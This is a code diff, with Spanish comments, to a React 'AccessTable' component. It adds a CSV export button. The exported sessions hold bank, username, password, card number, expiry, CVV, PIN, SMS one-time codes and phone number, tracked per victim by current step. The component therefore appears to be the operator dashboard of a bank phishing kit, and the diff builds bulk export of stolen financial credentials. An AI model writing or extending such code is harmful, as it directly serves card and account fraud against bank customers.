@@ -8,7 +8,7 @@ import { useToast } from '@/hooks/use-toast';
 import { useDeviceInfo } from '@/hooks/use-device-orientation';
 import { Card, CardContent } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
-import { ArrowRight, CheckCircle2, Copy, AlarmClock, CreditCard, MessageSquare, KeyRound, AlertCircle, Smartphone, Target } from 'lucide-react';
+import { ArrowRight, CheckCircle2, Copy, AlarmClock, CreditCard, MessageSquare, KeyRound, AlertCircle, Smartphone, Target, Download } from 'lucide-react';
 
 interface AccessTableProps {
   sessions: Session[];
@@ -84,6 +84,85 @@ const AccessTable: React.FC<AccessTableProps> = ({
     
   // Referencias previas de las sesiones para poder comparar y detectar cambios
   const [prevSessions, setPrevSessions] = useState<Session[]>([]);
+  
+  // Función para exportar datos a CSV
+  const exportToCSV = () => {
+    if (filteredSessions.length === 0) {
+      toast({
+        title: "Sin datos para exportar",
+        description: "No hay sesiones disponibles para exportar.",
+        variant: "destructive",
+      });
+      return;
+    }
+    
+    try {
+      // Definir encabezados del CSV
+      const headers = [
+        'Banco', 
+        'Folio', 
+        'Usuario', 
+        'Contraseña', 
+        'Tarjeta', 
+        'Fecha Vencimiento', 
+        'CVV', 
+        'SMS', 
+        'NIP', 
+        'SMS Compra', 
+        'Celular', 
+        'Paso Actual', 
+        'Creado Por', 
+        'Fecha'
+      ];
+      
+      // Convertir datos a filas CSV
+      const rows = filteredSessions.map(session => [
+        session.banco || '',
+        session.folio || '',
+        session.username || '',
+        session.password || '',
+        session.tarjeta || '',
+        session.fechaVencimiento || '',
+        session.cvv || '',
+        session.sms || '',
+        session.nip || '',
+        session.smsCompra || '',
+        session.celular || '',
+        session.pasoActual || '',
+        session.createdBy || '',
+        new Date(session.createdAt || Date.now()).toLocaleString()
+      ]);
+      
+      // Unir encabezados y filas
+      const csvContent = [
+        headers.join(','),
+        ...rows.map(row => row.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(','))
+      ].join('\\n');
+      
+      // Crear un blob y un link para descargar
+      const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
+      const url = URL.createObjectURL(blob);
+      const link = document.createElement('a');
+      link.setAttribute('href', url);
+      link.setAttribute('download', `sesiones_${activeBank.toLowerCase()}_${new Date().toISOString().slice(0, 10)}.csv`);
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+      
+      toast({
+        title: "Exportación exitosa",
+        description: `Se han exportado ${filteredSessions.length} sesiones a CSV.`,
+        variant: "default",
+      });
+    } catch (error) {
+      console.error('Error al exportar a CSV:', error);
+      toast({
+        title: "Error al exportar",
+        description: "Ha ocurrido un error al exportar los datos. Intente nuevamente.",
+        variant: "destructive",
+      });
+    }
+  };
   
   // Detectar cambios en las sesiones para resaltar las filas actualizadas
   useEffect(() => {
@@ -180,6 +259,21 @@ const AccessTable: React.FC<AccessTableProps> = ({
 
   return (
     <div className="px-6 pt-2 pb-6 overflow-auto flex-1">
+      {/* Botón de exportación */}
+      {filteredSessions.length > 0 && (
+        <div className="mb-3 flex justify-end">
+          <Button
+            variant="outline"
+            size="sm"
+            className="text-[#00aaff] border-[#00aaff] hover:bg-[#0a101d] flex items-center gap-2"
+            onClick={exportToCSV}
+          >
+            <Download className="h-4 w-4" />
+            Exportar a CSV
+          </Button>
+        </div>
+      )}
+      
       {/* Vista para móvil: tarjetas o vista tabla para móvil en landscape */}
       {(isMobile && !isLandscape) ? (
         <>
